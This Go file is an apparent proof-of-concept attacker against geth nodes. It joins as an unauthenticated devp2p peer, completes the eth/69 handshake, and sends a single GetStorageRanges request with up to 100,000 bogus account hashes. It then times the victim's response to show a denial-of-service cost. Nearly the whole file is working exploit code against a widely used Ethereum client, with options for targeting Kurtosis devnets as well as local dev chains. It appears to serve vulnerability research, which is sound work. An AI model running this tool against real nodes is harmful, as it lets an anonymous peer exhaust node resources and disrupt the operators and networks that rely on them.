// Command snap-attacker: a minimal devp2p peer that sends ONE GetStorageRanges
// request to a geth victim and measures the wall time until the response.
//
// It speaks the real wire protocols (eth/69 status handshake + snap/1), using
// go-ethereum's own p2p / eth / snap packages. It is NOT part of the victim:
// it runs as a separate process and connects to the victim like any remote
// peer (no authentication, no rate limiting on the victim side).
//
// Usage (victim must already be running with --http RPC enabled):
//
//	snap-attacker -rpc http://127.0.0.1:8545 -port 30303 -accounts 100000 -mode bogus
//	snap-attacker -rpc http://127.0.0.1:8545 -port 30303 -accounts 10 -mode real
//
// Modes:
//   - bogus: N deterministic bogus account hashes (sha256 of big-endian counter),
//     exactly like the in-process PoC test
//     (eth/protocols/snap/poc_k1_storage_ranges_test.go).
//   - real: the first N accounts that really exist in the dev chain state
//     (dev faucet + precompiles 0x01..0x09), addressed by their keccak256 hash.
//
// All output lines start with "POC " and are meant to be quoted verbatim.
package main

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"math/big"
	"net"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/core"
	"github.com/ethereum/go-ethereum/core/forkid"
	"github.com/ethereum/go-ethereum/core/types"
	"github.com/ethereum/go-ethereum/crypto"
	"github.com/ethereum/go-ethereum/eth/protocols/eth"
	"github.com/ethereum/go-ethereum/eth/protocols/snap"
	"github.com/ethereum/go-ethereum/p2p"
	"github.com/ethereum/go-ethereum/p2p/enode"
	"github.com/ethereum/go-ethereum/params"
	"github.com/ethereum/go-ethereum/rlp"
)

// Well-known geth --dev account key (public test key from cmd/utils/flags.go,
// DeveloperKey). Only used to derive the faucet address for the "real" mode.
const devKeyHex = "b71c71a67e1177ad4e901695e1b4b9ee17ae16c6668d313eac2f96dbcda3f291"

func logf(format string, args ...any) {
	fmt.Printf("POC "+format+"\n", args...)
}

func fatalf(format string, args ...any) {
	fmt.Fprintf(os.Stderr, "POC FATAL "+format+"\n", args...)
	os.Exit(1)
}

// rpcCall performs a single JSON-RPC call and returns the raw result.
func rpcCall(url, method string, params []any) (json.RawMessage, error) {
	body, _ := json.Marshal(map[string]any{
		"jsonrpc": "2.0", "id": 1, "method": method, "params": params,
	})
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	req, err := http.NewRequestWithContext(ctx, "POST", url, bytes.NewReader(body))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/json")
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	raw, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	var out struct {
		Result json.RawMessage `json:"result"`
		Error  *struct {
			Code    int    `json:"code"`
			Message string `json:"message"`
		} `json:"error"`
	}
	if err := json.Unmarshal(raw, &out); err != nil {
		return nil, fmt.Errorf("bad rpc response: %w (body: %s)", err, raw)
	}
	if out.Error != nil {
		return nil, fmt.Errorf("rpc %s: %d %s", method, out.Error.Code, out.Error.Message)
	}
	return out.Result, nil
}

func rpcString(url, method string, params []any) (string, error) {
	raw, err := rpcCall(url, method, params)
	if err != nil {
		return "", err
	}
	var s string
	if err := json.Unmarshal(raw, &s); err != nil {
		return "", err
	}
	return s, nil
}

type blockInfo struct {
	Number    uint64
	Hash      common.Hash
	StateRoot common.Hash
	Timestamp uint64
	Block     *types.Block // full block (for forkid computation)
}

func getBlock(url, num string) (*blockInfo, error) {
	raw, err := rpcCall(url, "eth_getBlockByNumber", []any{num, false})
	if err != nil {
		return nil, err
	}
	var b struct {
		Number    string `json:"number"`
		Hash      string `json:"hash"`
		StateRoot string `json:"stateRoot"`
		Timestamp string `json:"timestamp"`
	}
	if err := json.Unmarshal(raw, &b); err != nil {
		return nil, err
	}
	n, _ := new(big.Int).SetString(b.Number[2:], 16)
	ts, _ := new(big.Int).SetString(b.Timestamp[2:], 16)
	// types.Block has no JSON unmarshaller; unmarshal the header (the RPC
	// block JSON is flat header fields + txs/uncles) and wrap it.
	var hdr types.Header
	if err := json.Unmarshal(raw, &hdr); err != nil {
		return nil, fmt.Errorf("unmarshal header %s: %w", num, err)
	}
	return &blockInfo{
		Number:    n.Uint64(),
		Hash:      common.HexToHash(b.Hash),
		StateRoot: common.HexToHash(b.StateRoot),
		Timestamp: ts.Uint64(),
		Block:     types.NewBlockWithHeader(&hdr),
	}, nil
}

// bogusAccounts returns n deterministic bogus account hashes, identical to the
// in-process PoC test: sha256 of the big-endian counter.
func bogusAccounts(n int) []common.Hash {
	accounts := make([]common.Hash, n)
	for i := range accounts {
		var ctr [8]byte
		binary.BigEndian.PutUint64(ctr[:], uint64(i))
		accounts[i] = sha256.Sum256(ctr[:])
	}
	return accounts
}

// realAccounts returns the hashes of accounts that really exist in the dev
// chain state: the dev faucet plus precompiles 0x01..0x09.
func realAccounts(n int) []common.Hash {
	key, err := crypto.HexToECDSA(devKeyHex)
	if err != nil {
		fatalf("dev key: %v", err)
	}
	faucet := crypto.PubkeyToAddress(key.PublicKey)
	addrs := []common.Address{faucet}
	for i := byte(0x01); i <= 0x09; i++ {
		addrs = append(addrs, common.BytesToAddress([]byte{i}))
	}
	if n > len(addrs) {
		fatalf("real mode supports at most %d accounts (faucet + 9 precompiles), got %d", len(addrs), n)
	}
	accounts := make([]common.Hash, n)
	for i := 0; i < n; i++ {
		accounts[i] = crypto.Keccak256Hash(addrs[i].Bytes())
	}
	return accounts
}

type attackResult struct {
	wall        time.Duration // send -> full response decoded
	slots       int
	respBytes   int
	reqWireSize int
	err         error
}

func main() {
	rpcURL := flag.String("rpc", "http://127.0.0.1:8545", "victim HTTP-RPC URL")
	host := flag.String("host", "127.0.0.1", "victim host IP to dial (devp2p)")
	port := flag.Int("port", 30303, "victim devp2p TCP port")
	accountsN := flag.Int("accounts", 100000, "number of accounts in GetStorageRanges")
	mode := flag.String("mode", "bogus", "account set: bogus | real")
	bytesLimit := flag.Int("bytes", 2*1024*1024, "Bytes soft limit in the request")
	timeout := flag.Duration("timeout", 180*time.Second, "overall timeout")
	// Kurtosis adaptations (see RESEARCH.md §5). All three default to the
	// original local-PoC behavior when unset.
	genesisFile := flag.String("genesis-file", "", "path to the victim chain's genesis.json; when set, the fork ID is computed from its config (required for Kurtosis devnets, whose fork schedule is NOT AllDevChainProtocolChanges)")
	enodeFlag := flag.String("enode", "", "victim enode URL (enode://<pubkey>@...); when set, admin_nodeInfo is not queried")
	flag.Parse()

	// 1. Learn the victim's chain from its own RPC.
	chainIDHex, err := rpcString(*rpcURL, "eth_chainId", nil)
	if err != nil {
		fatalf("eth_chainId: %v", err)
	}
	chainID, _ := new(big.Int).SetString(chainIDHex[2:], 16)
	genesis, err := getBlock(*rpcURL, "0x0")
	if err != nil {
		fatalf("genesis block: %v", err)
	}
	head, err := getBlock(*rpcURL, "latest")
	if err != nil {
		fatalf("latest block: %v", err)
	}
	logf("victim chainId=%d genesis=%s headNumber=%d headHash=%s headStateRoot=%s",
		chainID.Uint64(), genesis.Hash, head.Number, head.Hash, head.StateRoot)

	// Victim node public key, parsed from the enode URL.
	// (admin_nodeInfo.id is the 32-byte node ID, NOT the public key, so the
	// key must come from the enode://<128-hex-pubkey>@... URL. The URL's
	// advertised port is 0 with --nodiscover/--nat none (local PoC) or a
	// container-internal address (Kurtosis), so the p2p port always comes
	// from the -port flag instead.)
	// -enode (Kurtosis): the runner resolves the enode first (admin_nodeInfo
	// or service logs) and passes it here, so this step needs no admin API.
	var enodeURL string
	if *enodeFlag != "" {
		enodeURL = *enodeFlag
		logf("using -enode flag, skipping admin_nodeInfo")
	} else {
		nodeInfoRaw, err := rpcCall(*rpcURL, "admin_nodeInfo", nil)
		if err != nil {
			fatalf("admin_nodeInfo: %v", err)
		}
		var nodeInfo struct {
			Enode string `json:"enode"`
		}
		if err := json.Unmarshal(nodeInfoRaw, &nodeInfo); err != nil {
			fatalf("admin_nodeInfo decode: %v", err)
		}
		enodeURL = nodeInfo.Enode
	}
	rest := strings.TrimPrefix(enodeURL, "enode://")
	at := strings.Index(rest, "@")
	if at < 0 {
		fatalf("bad enode url %q", enodeURL)
	}
	pubkeyBytes, err := hex.DecodeString(rest[:at])
	if err != nil {
		fatalf("enode pubkey decode: %v", err)
	}
	// 64-byte raw public key (x||y) -> 65-byte uncompressed form.
	if len(pubkeyBytes) == 64 {
		pubkeyBytes = append([]byte{0x04}, pubkeyBytes...)
	}
	pubkey, err := crypto.UnmarshalPubkey(pubkeyBytes)
	if err != nil {
		fatalf("node pubkey: %v", err)
	}
	victimNode := enode.NewV4(pubkey, net.ParseIP(*host), *port, *port)
	logf("victim enode=%s", victimNode.URLv4())

	// 2. Build the account list.
	var accounts []common.Hash
	switch *mode {
	case "bogus":
		accounts = bogusAccounts(*accountsN)
	case "real":
		accounts = realAccounts(*accountsN)
	default:
		fatalf("unknown mode %q (want bogus|real)", *mode)
	}
	req := &snap.GetStorageRangesPacket{
		ID: 1, Root: head.StateRoot, Accounts: accounts, Bytes: uint64(*bytesLimit),
	}
	wire, err := rlp.EncodeToBytes(req)
	if err != nil {
		fatalf("rlp encode request: %v", err)
	}
	logf("request mode=%s accounts=%d bytesLimit=%d wireSize=%d (maxMessageSize=%d)",
		*mode, len(accounts), *bytesLimit, len(wire), 10*1024*1024)

	// 3. Fork ID for our eth Status.
	// Local PoC (dev chain): all forks at 0, so AllDevChainProtocolChanges
	// is correct. Kurtosis devnet: the fork schedule is REAL (timestamp
	// forks = genesis time, some forks disabled entirely), so the fork ID
	// MUST come from the victim's own genesis.json (-genesis-file).
	// A wrong fork ID makes the victim reject the eth handshake (EIP-2124
	// validation) — the attack would fail before it starts.
	chainConfig := params.AllDevChainProtocolChanges
	if *genesisFile != "" {
		raw, err := os.ReadFile(*genesisFile)
		if err != nil {
			fatalf("read genesis file %s: %v", *genesisFile, err)
		}
		var g core.Genesis
		if err := json.Unmarshal(raw, &g); err != nil {
			fatalf("parse genesis file %s: %v", *genesisFile, err)
		}
		if g.Config == nil {
			fatalf("genesis file %s has no config section", *genesisFile)
		}
		if g.Config.ChainID == nil || g.Config.ChainID.Cmp(chainID) != 0 {
			fatalf("genesis file chainId %v != victim chainId %v (wrong genesis file?)", g.Config.ChainID, chainID)
		}
		chainConfig = g.Config
		logf("fork ID from genesis file %s (chainId %v)", *genesisFile, chainID)
	} else {
		logf("WARNING: no -genesis-file given, using AllDevChainProtocolChanges (correct only for --dev chains)")
	}
	forkID := forkid.NewID(chainConfig, genesis.Block, head.Number, head.Timestamp)
	logf("forkID=%x", forkID.Hash[:])

	// 4. p2p server with eth/69 + snap/1.
	ethDone := make(chan struct{})
	resultCh := make(chan attackResult, 1)

	ethProto := p2p.Protocol{
		Name: "eth", Version: 69, Length: 18,
		Run: func(p *p2p.Peer, rw p2p.MsgReadWriter) error {
			pkt := &eth.StatusPacket{
				ProtocolVersion: 69,
				NetworkID:       chainID.Uint64(),
				Genesis:         genesis.Hash,
				ForkID:          forkID,
				EarliestBlock:   0,
				LatestBlock:     head.Number,
				LatestBlockHash: head.Hash,
			}
			if err := p2p.Send(rw, eth.StatusMsg, pkt); err != nil {
				return fmt.Errorf("send eth status: %w", err)
			}
			msg, err := rw.ReadMsg()
			if err != nil {
				return fmt.Errorf("read eth status: %w", err)
			}
			if msg.Code != eth.StatusMsg {
				msg.Discard()
				return fmt.Errorf("first eth msg code %d, want status 0", msg.Code)
			}
			var st eth.StatusPacket
			if err := msg.Decode(&st); err != nil {
				return fmt.Errorf("decode eth status: %w", err)
			}
			msg.Discard()
			logf("eth handshake ok: remote proto=%d network=%d genesis=%s forkHash=%x latestBlock=%d",
				st.ProtocolVersion, st.NetworkID, st.Genesis, st.ForkID.Hash[:], st.LatestBlock)
			close(ethDone)
			// Drain loop: keep reading (and discarding) so the victim's eth
			// handler never blocks on us (e.g. block announcements).
			for {
				m, err := rw.ReadMsg()
				if err != nil {
					return err
				}
				m.Discard()
			}
		},
	}
	snapProto := p2p.Protocol{
		Name: "snap", Version: 1, Length: 8,
		Run: func(p *p2p.Peer, rw p2p.MsgReadWriter) error {
			<-ethDone // a real snap peer also does the eth handshake first
			sp := snap.NewPeer(1, p, rw)
			t0 := time.Now()
			if err := sp.RequestStorageRanges(1, head.StateRoot, accounts, nil, nil, *bytesLimit); err != nil {
				resultCh <- attackResult{err: fmt.Errorf("send GetStorageRanges: %w", err)}
				return err
			}
			sentAt := time.Now()
			logf("GetStorageRanges sent at %s (send took %s)", sentAt.Format(time.RFC3339Nano), sentAt.Sub(t0))
			for {
				msg, err := rw.ReadMsg()
				if err != nil {
					resultCh <- attackResult{err: fmt.Errorf("read snap response: %w", err)}
					return err
				}
				if msg.Code == snap.StorageRangesMsg {
					var resp snap.StorageRangesPacket
					if err := msg.Decode(&resp); err != nil {
						msg.Discard()
						resultCh <- attackResult{err: fmt.Errorf("decode StorageRanges: %w", err)}
						return err
					}
					size := int(msg.Size)
					msg.Discard()
					slots := 0
					for _, l := range resp.Slots {
						slots += len(l)
					}
					resultCh <- attackResult{
						wall:        time.Since(t0),
						slots:       slots,
						respBytes:   size,
						reqWireSize: len(wire),
					}
					return nil
				}
				msg.Discard()
			}
		},
	}

	key, err := crypto.GenerateKey()
	if err != nil {
		fatalf("generate key: %v", err)
	}
	server := &p2p.Server{Config: p2p.Config{
		PrivateKey:  key,
		MaxPeers:    5,
		Name:        "snap-poc-attacker",
		ListenAddr:  "127.0.0.1:0",
		Protocols:   []p2p.Protocol{ethProto, snapProto},
		NoDiscovery: true,
	}}
	if err := server.Start(); err != nil {
		fatalf("p2p server start: %v", err)
	}
	defer server.Stop()
	logf("attacker listening, dialing victim...")
	server.AddPeer(victimNode)

	select {
	case res := <-resultCh:
		if res.err != nil {
			fatalf("attack failed: %v", res.err)
		}
		logf("RESULT mode=%s accounts=%d wall=%s slotsReturned=%d respBytes=%d reqWireSize=%d",
			*mode, len(accounts), res.wall, res.slots, res.respBytes, res.reqWireSize)
		logf("RESULT perAccount=%.2fµs", float64(res.wall.Nanoseconds())/float64(len(accounts))/1000)
	case <-time.After(*timeout):
		fatalf("timeout %s waiting for StorageRanges response", *timeout)
	}
}
